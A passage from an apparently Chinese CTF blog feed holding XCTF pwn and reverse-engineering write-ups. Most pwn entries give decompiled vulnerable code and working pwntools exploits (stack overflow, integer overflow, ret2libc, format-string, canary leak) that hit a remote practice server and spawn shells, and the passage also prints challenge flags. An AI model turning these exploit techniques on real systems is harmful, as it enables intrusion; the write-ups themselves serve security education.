6 + 1;    printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));    printf(&quot;Please input your guess number:&quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v6);    puts(&quot;---------------------------------&quot;);    if ( v6 != v8 )    &#123;      puts(&quot;GG!&quot;);      exit(1);    &#125;    v4 = &quot;Success!&quot;;    puts(&quot;Success!&quot;);  &#125;  sub_C3E(v4);  return 0LL;&#125;</code></pre><p>这里首先看到是猜随机生成的数，然后如果所有的数都猜对了，就调用最后一个函数输出flag，首先的想法就是要替换掉seed，变成我们已知的数字，就可以调用相同版本的libc里的随机数生成函数，来生成同样的数，exp如下:</p><pre><code class="python">from pwn import *from ctypes import *# io = process(&#39;./guess_num&#39;)io = remote(&#39;111.198.29.45&#39;, 46930)# elf=ELF(&#39;./guess_num&#39;)# libc=elf.libclibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)payload = &#39;a&#39;*0x20 + p64(0)io.recvuntil(&#39;Your name:&#39;)io.sendline(payload)libc.srand(0)for i in range(10):    num = str(libc.rand() % 6+1)    io.recvuntil(&#39;number:&#39;)    io.sendline(num)io.interactive()</code></pre><h4 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int v4; // [esp+Ch] [ebp-Ch]  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  puts(&quot;---------------------&quot;);  puts(&quot;~~ Welcome to CTF! ~~&quot;);  puts(&quot;       1.Login       &quot;);  puts(&quot;       2.Exit        &quot;);  puts(&quot;---------------------&quot;);  printf(&quot;Your choice:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  if ( v4 == 1 )  &#123;    login();  &#125;  else  &#123;    if ( v4 == 2 )    &#123;      puts(&quot;Bye~&quot;);      exit(0);    &#125;    puts(&quot;Invalid Choice!&quot;);  &#125;  return 0;&#125;</code></pre><p>肯定选择1，进入<code>login()</code>函数</p><pre><code class="c++">int login()&#123;  char buf; // [esp+0h] [ebp-228h]  char s; // [esp+200h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  memset(&amp;buf, 0, 0x200u);  puts(&quot;Please input your username:&quot;);  read(0, &amp;s, 0x19u);  printf(&quot;Hello %s\n&quot;, &amp;s);  puts(&quot;Please input your passwd:&quot;);  read(0, &amp;buf, 0x199u);  return check_passwd(&amp;buf);&#125;char *__cdecl check_passwd(char *s)&#123;  char *result; // eax  char dest; // [esp+4h] [ebp-14h]  unsigned __int8 v3; // [esp+Fh] [ebp-9h]  v3 = strlen(s);  if ( v3 &lt;= 3u || v3 &gt; 8u )  &#123;    puts(&quot;Invalid Password&quot;);    result = (char *)fflush(stdout);  &#125;  else  &#123;    puts(&quot;Success&quot;);    fflush(stdout);    result = strcpy(&amp;dest, s);  &#125;  return result;&#125;</code></pre><p>然后发现了一个奇怪的函数，可以利用</p><pre><code class="c++">int what_is_this()&#123;  return system(&quot;cat flag&quot;);&#125;</code></pre><p>按理说我们只需要覆盖掉<code>check_passwd()</code>的返回值，然后伪造system栈帧就可以了，但是这里限制了我们输入的长度，但是观察汇编之后发现这个变量值是从<code>al</code>寄存器<code>mov</code>过来的，只能存储0-255的数字，因此我们可以输入259-263之间的字符数，就可以实现我们的目标，exp如下:</p><pre><code class="python">from pwn import *elf=ELF(&#39;./int_overflow&#39;)sys_addr=elf.symbols[&#39;what_is_this&#39;]# print hex(sys_addr)# io=process(&#39;./int_overflow&#39;)io=remote(&#39;111.198.29.45&#39;,41386)io.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)io.sendlineafter(&#39;Please input your username:&#39;,&#39;rycbar&#39;)io.recvuntil(&#39;Please input your passwd:&#39;)payload=&#39;a&#39;*0x14+&#39;a&#39;*4+p32(sys_addr)payload=payload.ljust(263,&#39;a&#39;)io.send(payload)io.recv()io.interactive()</code></pre><h4 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h4><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  hello();  puts(&quot;thank you&quot;);  return 0;&#125;char *hello()&#123;  char *v0; // eax  signed int v1; // ebx  unsigned int v2; // ecx  char *v3; // eax  char s; // [esp+12h] [ebp-26h]  int v6; // [esp+14h] [ebp-24h]  v0 = &amp;s;  v1 = 30;  if ( (unsigned int)&amp;s &amp; 2 )  &#123;    *(_WORD *)&amp;s = 0;    v0 = (char *)&amp;v6;    v1 = 28;  &#125;  v2 = 0;  do  &#123;    *(_DWORD *)&amp;v0[v2] = 0;    v2 += 4;  &#125;  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );  v3 = &amp;v0[v2];  if ( v1 &amp; 2 )  &#123;    *(_WORD *)v3 = 0;    v3 += 2;  &#125;  if ( v1 &amp; 1 )    *v3 = 0;  puts(&quot;please tell me your name&quot;);  fgets(name, 50, stdin);  puts(&quot;hello,you can leave some message here:&quot;);  return gets(&amp;s);&#125;int pwn()&#123;  return system(&quot;echo hehehe&quot;);&#125;</code></pre><p>所有需要用到的函数都在这里，可以看到自带system函数，但是没有<code>/bin/sh</code>，所以需要手动构造，正好之前输入了一个<code>name</code>是一个全局变量，可以直接找到地址，以此构造ROP，exp如下：</p><pre><code class="python">from pwn import *sh_addr=0x0804A080elf=ELF(&#39;./cgpwn2&#39;)sys_addr=elf.symbols[&#39;system&#39;]io=process(&#39;./cgpwn2&#39;)io=remote(&#39;111.198.29.45&#39;,52898)io.sendlineafter(&#39;please tell me your name&#39;,&#39;/bin/sh&#39;)io.recvuntil(&#39;hello,you can leave some message here:&#39;)payload=&#39;a&#39;*0x26+p32(0)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive()</code></pre><h4 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h4><p>简单的栈溢出，经典题目，有膜法</p><pre><code class="python">from pwn import *# io=process(&#39;./when_did_you_born&#39;)io=remote(&#39;111.198.29.45&#39;,47087)io.sendlineafter(&#39;What\&#39;s Your Birth?&#39;,&#39;1000&#39;)io.recvuntil(&quot;What&#39;s Your Name?&quot;)payload=&#39;a&#39;*(0x20-0x18)+p64(1926)io.sendline(payload)io.interactive()</code></pre><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>比上一题更简单的溢出（半斤八两）</p><pre><code class="python">from pwn import *# io=process(&#39;./hello_pwn&#39;)io=remote(&#39;111.198.29.45&#39;,42456)io.recvuntil(&#39;bof&#39;)payload=&#39;a&#39;*4+p64(1853186401)io.sendline(payload)io.interactive()</code></pre><h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>ret2libc，泄露一个函数地址然后算偏移，控制程序流程再执行一次漏洞函数，拿到shell</p><pre><code class="python">from pwn import *from LibcSearcher import *# io=process(&#39;./level3&#39;)io=remote(&#39;111.198.29.45&#39;,41019)elf=ELF(&#39;./level3&#39;)write_plt=elf.plt[&#39;write&#39;]vuln_addr = elf.symbols[&#39;vulnerable_function&#39;]write_got=elf.got[&#39;write&#39;]payload=&#39;a&#39;*0x88+p32(0)+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)io.recvuntil(&#39;Input:\n&#39;)io.sendline(payload)write_leak=u32(io.recv()[:4])libc=LibcSearcher(&#39;write&#39;,write_leak)libc_base = write_leak - libc.dump(&#39;write&#39;)sys_addr=libc_base+libc.dump(&#39;system&#39;)bin_sh_addr=libc_base+libc.dump(&#39;str_bin_sh&#39;)io.recv()payload=&#39;a&#39;*0x88+p32(0)+p32(sys_addr)+p32(0)+p32(bin_sh_addr)io.sendline(payload)io.interactive()</code></pre><p>这里还有个问题没解决，在本地运行一直不行，但是在服务器端就可以拿到shell，暂时还不知道原因</p><h4 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h4><p>也是很简单的一道题，但不知道为什么gdb和远程都能过，就是本地直接运行一直报segmentation fault</p><pre><code class="python">from pwn import *sys_addr=0x400596pop_ret_addr=0x400663main_addr=0x4005c6 # io=process(&#39;./level0/level0&#39;)io=remote(&#39;111.198.29.45&#39;,47038)payload=&#39;a&#39;*(0x80+8)+p64(sys_addr)# print payloadio.recv()io.send(payload)io.interactive()</code></pre><h4 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h4><p>格式化字符串漏洞的利用</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int buf; // [esp+1Eh] [ebp-7Eh]  int v5; // [esp+22h] [ebp-7Ah]  __int16 v6; // [esp+26h] [ebp-76h]  char s; // [esp+28h] [ebp-74h]  unsigned int v8; // [esp+8Ch] [ebp-10h]  v8 = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  buf = 0;  v5 = 0;  v6 = 0;  memset(&amp;s, 0, 0x64u);  puts(&quot;please tell me your name:&quot;);  read(0, &amp;buf, 0xAu);  puts(&quot;leave your message please:&quot;);  fgets(&amp;s, 100, stdin);  printf(&quot;hello %s&quot;, &amp;buf);  puts(&quot;your message is:&quot;);  printf(&amp;s);  if ( pwnme == 8 )  &#123;    puts(&quot;you pwned me, here is your flag:\n&quot;);    system(&quot;cat flag&quot;);  &#125;  else  &#123;    puts(&quot;Thank you!&quot;);  &#125;  return 0;&#125;</code></pre><p>两次输入，第一次只能输入10个字符，不够我们构造<code>payload</code>，所以利用第二次输入的格式化字符串漏洞实现任意地址可写，修改<code>pwnme</code>的值，<code>exp</code>如下：</p><pre><code class="python">from pwn import *pwnme=0x0804A068payload=p32(pwnme)+&#39;a&#39;*4+&#39;%10$n&#39;# io=process(&#39;./CGfsb&#39;)io=remote(&#39;111.198.29.45&#39;,37888)io.sendlineafter(&#39;name:&#39;,&#39;a&#39;)io.recvuntil(&#39;please:&#39;)io.sendline(payload)io.interactive()</code></pre><p>很简单，直接输出flag</p><pre><code>cyberpeace&#123;428fd5c839a04a6d162bdd6610a094cf&#125;</code></pre><h4 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h4><p>这道题简单的溢出就可以解决了</p><pre><code class="c++">int __cdecl main()&#123;  size_t v0; // ebx  char v2[32]; // [esp+10h] [ebp-74h]  int (*v3)(); // [esp+30h] [ebp-54h]  int (*v4)(); // [esp+34h] [ebp-50h]  int (*v5)(); // [esp+38h] [ebp-4Ch]  int (*v6)(); // [esp+3Ch] [ebp-48h]  int (*v7)(); // [esp+40h] [ebp-44h]  int (*v8)(); // [esp+44h] [ebp-40h]  int (*v9)(); // [esp+48h] [ebp-3Ch]  int (*v10)(); // [esp+4Ch] [ebp-38h]  int (*v11)(); // [esp+50h] [ebp-34h]  int (*v12)(); // [esp+54h] [ebp-30h]  char s; // [esp+58h] [ebp-2Ch]  int v14; // [esp+78h] [ebp-Ch]  size_t i; // [esp+7Ch] [ebp-8h]  v14 = 1;  v3 = sub_8048604;  v4 = sub_8048618;  v5 = sub_804862C;  v6 = sub_8048640;  v7 = sub_8048654;  v8 = sub_8048668;  v9 = sub_804867C;  v10 = sub_8048690;  v11 = sub_80486A4;  v12 = sub_80486B8;  puts(&quot;What is your name?&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  fgets(&amp;s, 32, stdin);  sub_80485DD((int)&amp;s);  fflush(stdout);  printf(&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;, sub_8048654);  fflush(stdout);  puts(&quot;Enter the string to be validate&quot;);  printf(&quot;&gt; &quot;);  fflush(stdout);  __isoc99_scanf(&quot;%s&quot;, v2);  for ( i = 0; ; ++i )  &#123;    v0 = i;    if ( v0 &gt;= strlen(v2) )      break;    switch ( v14 )    &#123;      case 1:        if ( sub_8048702(v2[i]) )          v14 = 2;        break;      case 2:        if ( v2[i] == 64 )          v14 = 3;        break;      case 3:        if ( sub_804874C(v2[i]) )          v14 = 4;        break;      case 4:        if ( v2[i] == 46 )          v14 = 5;        break;      case 5:        if ( sub_8048784(v2[i]) )          v14 = 6;        break;      case 6:        if ( sub_8048784(v2[i]) )          v14 = 7;        break;      case 7:        if ( sub_8048784(v2[i]) )          v14 = 8;        break;      case 8:        if ( sub_8048784(v2[i]) )          v14 = 9;        break;      case 9:        v14 = 10;        break;      default:        continue;    &#125;  &#125;  (*(&amp;v3 + --v14))();  return fflush(stdout);&#125;</code></pre><p>有两个输入的地方，第一个地方严格控制了输入的字符数，所以没什么用，第二个用了<code>scanf</code>，可以无限制的输入，利用这个地方来控制我们的程序。</p><p>这个程序开了<code>NX</code>，所以找找有没有可以利用的函数，找到</p><pre><code class="c++">int sub_80486CC()&#123;  char s; // [esp+1Eh] [ebp-3Ah]  snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);  return system(&amp;s);&#125;</code></pre><p>接下来考虑怎么利用。程序最后会根据<code>v14</code>的值来判断该执行那个函数，看到有些人想要覆盖<code>v14</code>的值，我的做法就是保留<code>v14=1</code>然后去替换<code>v3</code>的值，因为即使替换掉<code>v14</code>，后面也会被修改。</p><p>下一步就是要控制<code>v14</code>的值不变，我的做法是在写入的时候先写入一个<code>&#39;\0&#39;</code>，这样判断字符串长度的时候为0，直接跳出循环。<code>exp</code>如下：</p><pre><code class="python">from pwn import *# io=process(&#39;./forgot&#39;)io=remote(&#39;111.198.29.45&#39;,40669)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;a&#39;)payload=&#39;\0&#39;+&#39;A&#39;*0x1f+p32(0x80486cc)io.recvuntil(&#39;&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>得到flag</p><pre><code>cyberpeace&#123;3a2c567e832c79478c593e5f6f334830&#125;</code></pre><h4 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h4><p>题目里面一共有两个漏洞，并且都标明出来了，不需要自己去找</p><pre><code class="c++">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+24h] [rbp-Ch]  unsigned __int64 v4; // [rsp+28h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_4009FF();  puts(&quot;Welcome to the battle ! &quot;);  puts(&quot;[Great Fairy] level pwned &quot;);  puts(&quot;Select your weapon &quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_4009DA();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      sub_4008EB();    &#125;    if ( v3 == 3 )    &#123;      puts(&quot;Bye &quot;);      exit(0);    &#125;    if ( v3 == 1 )      sub_400960();    else      puts(&quot;Wrong!&quot;);  &#125;&#125;int sub_4009DA()&#123;  puts(&quot;1. Stack Bufferoverflow Bug &quot;);  puts(&quot;2. Format String Bug &quot;);  return puts(&quot;3. Exit the battle &quot;);&#125;</code></pre><p>选择2的话会进入一个包含格式化字符串漏洞的函数，选择1会进入一个有栈溢出漏洞的函数</p><pre><code class="c++">//格式化字符串unsigned __int64 sub_4008EB()&#123;  char buf; // [rsp+0h] [rbp-90h]  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(&amp;buf, 0, 0x80uLL);  read(0, &amp;buf, 0x7FuLL);  printf(&amp;buf, &amp;buf);  return __readfsqword(0x28u) ^ v2;&#125;//栈溢出unsigned __int64 sub_400960()&#123;  char buf; // [rsp+0h] [rbp-90h]  unsigned __int64 v2; // [rsp+88h] [rbp-8h]  v2 = __readfsqword(0x28u);  memset(&amp;buf, 0, 0x80uLL);  read(0, &amp;buf, 0x100uLL);  printf(&quot;-&gt; %s\n&quot;, &amp;buf);  return __readfsqword(0x28u) ^ v2;&#125;//目标函数int sub_4008DA()&#123;  return system(&quot;/bin/cat ./flag&quot;);&#125;</code></pre><p>如果<code>checksec</code>或者直接看到<code>v2</code>就可以发现，这个程序开了<code>cannary</code>保护，所以直接溢出是不行的，这时候可以考虑利用格式化字符串漏洞泄露<code>cannary</code>的值，因为进程没有中止就进入了下一个循环，所以<code>cannary</code>的值是不变的，这个时候选择利用栈溢出漏洞，覆盖返回地址为目标函数即可。这里虽然是64位，但是调用的函数没有参数，没必要构造很复杂的ROP链来控制程序执行流程。</p><p><code>exp</code>如下：</p><pre><code class="python">from pwn import *sys_addr=0x4008da# io=process(&#39;./Mary_Morton&#39;)io=remote(&#39;111.198.29.45&#39;,39178)io.recvuntil(&quot;3. Exit the battle \n&quot;)io.sendline(&quot;2&quot;)io.sendline(&quot;%23$p&quot;)cannary= int(io.recvline().strip(&#39;\n&#39;),16)print cannaryio.recvuntil(&quot;3. Exit the battle \n&quot;)io.sendline(&quot;1&quot;)payload=&quot;&quot;payload+=&#39;a&#39;*0x88payload+=p64(cannary)payload+=p64(0)payload+=p64(sys_addr)io.sendline(payload)io.interactive()</code></pre><p>得到flag</p><pre><code>cyberpeace&#123;8b06a4becaf5e73cd79ea7d283d0bd89&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-re部分题解（四）</title>
      <link href="/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>最近比较忙，而且题目越做越快，平时的练习除非特别值得注意的，都不会写的太详细了</p><span id="more"></span><h4 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h4><p>这题本身的算法没什么难度，主要就是花指令的去除，去除之后就只是简单的字符串比较了，很容易。</p><pre><code>EZ9dmq4c8g9G7bAV</code></pre><h4 id="testre"><a href="#testre" class="headerlink" title="testre"></a>testre</h4><p>主要就是一个base58，很好做，尝试了一下ghidra的效果发现不尽如人意，所以主要还是采用IDA做题。</p><pre><code>flag&#123;base58_is_boring&#125;</code></pre><h4 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h4><p>这题没什么好写的，虽然前面的check函数进行了检测，但是后面的计算和前面的输入没什么关系，并且直接把flag给输出了，所以直接gdb调试改了<code>eax</code>的值直接输出flag就好了</p><pre><code>flag_is_you_know_cracking!!!</code></pre><h4 id="secret-string-400"><a href="#secret-string-400" class="headerlink" title="secret-string-400"></a>secret-string-400</h4><p>一直不知道这是什么，后来发现这竟然是个压缩包，里面有个网页和调用的js，js里面可以看到把机器码转成了命令然后执行，所以在执行之前输出一下</p><pre><code>console.log(command);</code></pre><p>在console里找到了关键判断</p><pre><code>var f=window.machine.registers[1].userinputvar i = f.lengthvar nonce = &#39;groke&#39;;var j = 0;var out = [];var eq = true;while(j &lt; i)&#123;    out.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5))    j++;&#125;var ex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];if (ex.length == out.length) &#123;    j = 0;    while(j &lt; ex.length)&#123;        if(ex[j] != out[j])        eq = false;        j += 1;    &#125;if(eq)&#123;    alert(&#39;YOU WIN!&#39;);&#125;else&#123;    alert(&#39;NOPE!&#39;);&#125;&#125;else&#123;alert(&#39;NOPE!&#39;);&#125;</code></pre><p>过程非常简单，也是闲着无聊，写了个什么都没有的网页</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;decode&lt;/title&gt;    &lt;script type=&#39;text/javascript&#39; src=&#39;out.js&#39;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;br/&gt;    &lt;input type=&#39;button&#39; onclick=&quot;run()&quot; value=&#39;decode&#39;&gt;&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><pre><code class="javascript">function run() &#123;    const nonce = &#39;groke&#39;;    let j = 0;    let flag =&#39;&#39;;    const ex = [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];    let i = ex.length;    while (j &lt; i) &#123;        flag+=String.fromCharCode(ex[j] ^ nonce.charCodeAt(j % 5));        j++;    &#125;    alert(flag);&#125;</code></pre><p>点击按钮获得flag</p><pre><code>flag is: WOW_so_EASY</code></pre><h4 id="windows-reverse2"><a href="#windows-reverse2" class="headerlink" title="windows_reverse2"></a>windows_reverse2</h4><p>首先是脱壳，看雪脱壳工具就可以，也可以手动脱壳，IDA研究之后发现中间一个函数的作用不是很明朗，OD调试一下根据结果猜测可能是16进制转base64，试了一下就对了。</p><pre><code>ADEBDEAEC7BE</code></pre><h4 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h4><p>这题的就是直接会输出flag，但是进行了大量费事而且毫无意义的计算，需要仔细分析一下每一部分的函数作用，简化计算的过程，总共只有三个运算函数，很简单，就不一一分析了，直接计算flag：</p><pre><code class="c++">#include&lt;iostream&gt;using namespace std;int* sub(int *a, int b) &#123;     *a -= b;     return a;&#125;int* add(int *a, int b) &#123;    *a += b;    return a;&#125;int* mul(int *a, int b) &#123;    *a *= b;    return a;&#125;int __cdecl main(int argc, const char **argv, const char **envp) &#123;    int *v3; // eax    int *v4; // eax    int *v5; // eax    int *v6; // eax    int *v7; // eax    int *v8; // eax    int *v9; // eax    int *v10; // eax    int *v11; // eax    int *v12; // eax    int *v13; // eax    int *v14; // eax    int *v15; // eax    int *v16; // eax    int *v17; // eax    int *v18; // eax    int *v19; // eax    int *v20; // eax    int *v21; // eax    int *v22; // eax    int *v23; // eax    int *v24; // eax    int *v25; // eax    int *v26; // eax    int *v27; // eax    int *v28; // eax    int *v29; // eax    int *v30; // eax    int *v31; // eax    int *v32; // eax    int *v33; // eax    int *v34; // eax    int *v35; // eax    int *v36; // eax    int *v37; // eax    int *v38; // eax    int *v39; // eax    int *v40; // eax    int *v41; // eax    int *v42; // eax    int *v43; // eax    int *v44; // eax    int *v45; // eax    int *v46; // eax    int *v47; // eax    int *v48; // eax    int *v49; // eax    int *v50; // eax    int *v51; // eax    int *v52; // eax    int *v53; // eax    int *v54; // eax    int *v55; // eax    int *v56; // eax    int *v57; // eax    int *v58; // eax    int *v59; // eax    int *v60; // eax    int *v61; // eax    int *v62; // eax    int *v63; // eax    int *v64; // eax    int *v65; // eax    int *v66; // eax    int *v67; // eax    int *v68; // eax    int *v69; // eax    int *v70; // eax    int *v71; // eax    int *v72; // eax    int *v73; // eax    int *v74; // eax    int *v75; // eax    int *v76; // eax    int *v77; // eax    int *v78; // eax    int *v79; // eax    int *v80; // eax    int *v81; // eax    int *v82; // eax    int *v83; // eax    int *v84; // eax    int *v85; // eax    int *v86; // eax    int *v87; // eax    int *v88; // eax    int *v89; // eax    int *v90; // eax    int *v91; // eax    int *v92; // eax    int *v93; // eax    int *v94; // eax    int *v95; // eax    int *v96; // eax    int *v97; // eax    int *v98; // eax    int *v99; // eax    int *v100; // eax    int *v101; // eax    int *v102; // eax    int *v103; // eax    int *v104; // eax    int *v105; // eax    int *v106; // eax    int *v107; // eax    int *v108; // eax    int v109; // ST1C_4    int *v110; // eax    int *v111; // eax    int v112; // ST20_4    int *v113; // eax    int *v114; // eax    int v115; // ST20_4    int *v116; // eax    int flag[32]; // [esp+Ch] [ebp-88h]    int v121; // [esp+8Ch] [ebp-8h]    for (int i = 0; i &lt; 32; ++i )        flag[i] = 1;    v121 = 0;    puts(&quot;Your flag is:&quot;);    v3 = mul(flag, 1000000000);    v4 = sub(v3, 999999950);    mul(v4, 2);    v5 = add(&amp;flag[1], 5000000);    v6 = sub(v5, 6666666);    v7 = add(v6, 1666666);    v8 = add(v7, 45);    v9 = mul(v8, 2);    add(v9, 5);    v10 = mul(&amp;flag[2], 1000000000);    v11 = sub(v10, 999999950);    v12 = mul(v11, 2);    add(v12, 2);    v13 = add(&amp;flag[3], 55);    v14 = sub(v13, 3);    v15 = add(v14, 4);    sub(v15, 1);    v16 = mul(&amp;flag[4], 100000000);    v17 = sub(v16, 99999950);    v18 = mul(v17, 2);    add(v18, 2);    v19 = sub(&amp;flag[5], 1);    v20 = mul(v19, 1000000000);    v21 = add(v20, 55);    sub(v21, 3);    v22 = mul(&amp;flag[6], 1000000);    v23 = sub(v22, 999975);    mul(v23, 4);    v24 = add(&amp;flag[7], 55);    v25 = sub(v24, 33);    v26 = add(v25, 44);    sub(v26, 11);    v27 = mul(&amp;flag[8], 10);    v28 = sub(v27, 5);    v29 = mul(v28, 8);    add(v29, 9);    v30 = add(&amp;flag[9], 0);    v31 = sub(v30, 0);    v32 = add(v31, 11);    v33 = sub(v32, 11);    add(v33, 53);    v34 = add(&amp;flag[10], 49);    v35 = sub(v34, 2);    v36 = add(v35, 4);    sub(v36, 2);    v37 = mul(&amp;flag[11], 1000000);    v38 = sub(v37, 999999);    v39 = mul(v38, 4);    add(v39, 50);    v40 = add(&amp;flag[12], 1);    v41 = add(v40, 1);    v42 = add(v41, 1);    v43 = add(v42, 1);    v44 = add(v43, 1);    v45 = add(v44, 1);    v46 = add(v45, 10);    add(v46, 32);    v47 = mul(&amp;flag[13], 10);    v48 = sub(v47, 5);    v49 = mul(v48, 8);    v50 = add(v49, 9);    add(v50, 48);    v51 = sub(&amp;flag[14], 1);    v52 = mul(v51, -294967296);    v53 = add(v52, 55);    sub(v53, 3);    v54 = add(&amp;flag[15], 1);    v55 = add(v54, 2);    v56 = add(v55, 3);    v57 = add(v56, 4);    v58 = add(v57, 5);    v59 = add(v58, 6);    v60 = add(v59, 7);    add(v60, 20);    v61 = mul(&amp;flag[16], 10);    v62 = sub(v61, 5);    v63 = mul(v62, 8);    v64 = add(v63, 9);    add(v64, 48);    v65 = add(&amp;flag[17], 7);    v66 = add(v65, 6);    v67 = add(v66, 5);    v68 = add(v67, 4);    v69 = add(v68, 3);    v70 = add(v69, 2);    v71 = add(v70, 1);    add(v71, 20);    v72 = add(&amp;flag[18], 7);    v73 = add(v72, 2);    v74 = add(v73, 4);    v75 = add(v74, 3);    v76 = add(v75, 6);    v77 = add(v76, 5);    v78 = add(v77, 1);    add(v78, 20);    v79 = mul(&amp;flag[19], 1000000);    v80 = sub(v79, 999999);    v81 = mul(v80, 4);    v82 = add(v81, 50);    sub(v82, 1);    v83 = sub(&amp;flag[20], 1);    v84 = mul(v83, -294967296);    v85 = add(v84, 49);    sub(v85, 1);    v86 = sub(&amp;flag[21], 1);    v87 = mul(v86, 1000000000);    v88 = add(v87, 54);    v89 = sub(v88, 1);    v90 = add(v89, 1000000000);    sub(v90, 1000000000);    v91 = add(&amp;flag[22], 49);    v92 = sub(v91, 1);    v93 = add(v92, 2);    sub(v93, 1);    v94 = mul(&amp;flag[23], 10);    v95 = sub(v94, 5);    v96 = mul(v95, 8);    v97 = add(v96, 9);    add(v97, 48);    v98 = add(&amp;flag[24], 1);    v99 = add(v98, 3);    v100 = add(v99, 3);    v101 = add(v100, 3);    v102 = add(v101, 6);    v103 = add(v102, 6);    v104 = add(v103, 6);    add(v104, 20);    v105 = add(&amp;flag[25], 55);    v106 = sub(v105, 33);    v107 = add(v106, 44);    v108 = sub(v107, 11);    add(v108, 42);    add(&amp;flag[26], flag[25]);    add(&amp;flag[27], flag[12]);    v109 = flag[27];    v110 = sub(&amp;flag[28], 1);    v111 = add(v110, v109);    sub(v111, 1);    v112 = flag[23];    v113 = sub(&amp;flag[29], 1);    v114 = mul(v113, 1000000);    add(v114, v112);    v115 = flag[27];    v116 = add(&amp;flag[30], 1);    mul(v116, v115);    add(&amp;flag[31], flag[30]);    printf(&quot;CTF&#123;&quot;);    for (int j = 0; j &lt; 32; ++j)        printf(&quot;%c&quot;, char(flag[j]));    puts(&quot;&#125;&quot;);    return 0;&#125;</code></pre><p>直接输出flag</p><pre><code class="c++">Your flag is:CTF&#123;daf8f4d816261a41a115052a1bc21ade&#125;</code></pre><h4 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h4><p>先查壳，发现是upx，脱壳</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int pipedes[2]; // [esp+18h] [ebp-38h]  __pid_t v5; // [esp+20h] [ebp-30h]  int v6; // [esp+24h] [ebp-2Ch]  char buf; // [esp+2Eh] [ebp-22h]  unsigned int v8; // [esp+4Ch] [ebp-4h]  v8 = __readgsdword(0x14u);  pipe(pipedes);  v5 = fork();  if ( !v5 )  &#123;    puts(&quot;\nOMG!!!! I forgot kid&#39;s id&quot;);    write(pipedes[1], &quot;69800876143568214356928753&quot;, 29u);    puts(&quot;Ready to exit     &quot;);    exit(0);  &#125;  read(pipedes[0], &amp;buf, 29u);  __isoc99_scanf(&quot;%d&quot;, &amp;v6);  if ( v6 == v5 )  &#123;    if ( (*(_DWORD *)((_BYTE *)lol + 3) &amp; 0xFF) == 204 )    &#123;      puts(&quot;:D&quot;);      exit(1);    &#125;    printf(&quot;\nYou got the key\n &quot;);    lol(&amp;buf);  &#125;  wait(0);  return 